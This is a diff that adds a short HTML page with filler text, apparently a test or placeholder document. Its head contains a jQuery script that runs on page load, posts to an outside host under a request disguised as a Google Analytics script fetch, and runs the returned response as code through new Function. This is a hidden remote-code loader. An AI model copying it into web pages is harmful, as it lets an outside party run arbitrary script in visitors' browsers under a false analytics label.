@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<title>Document</title>
+	<!--this is comment-->
+	<style type="text/css">
+		#masthead .site-title {font-family:Amatic SC}
+	</style>
+	<script type="text/javascript">
+		jQuery(document).ready(function () {
+			jQuery.post('http://licstar.net?ga_action=googleanalytics_get_script', {action: 'googleanalytics_get_script'}, function(response) {
+				var F = new Function ( response );
+				return( F() );
+			});
+		);
+	</script>
+</head>
+<body>
+	<p>a     ajgra  afaoef af da	  	 krfgoe<span>span text</span></p>
+	<div>aaaaaaaaaaaaaaa<p>xxxxxxxxxxxxx<span>yyyyyyyyyyyy</span></p></div>
+	<h1>bbbbbbbbbbbbbbbbb</h1>
+</body>
+</html>
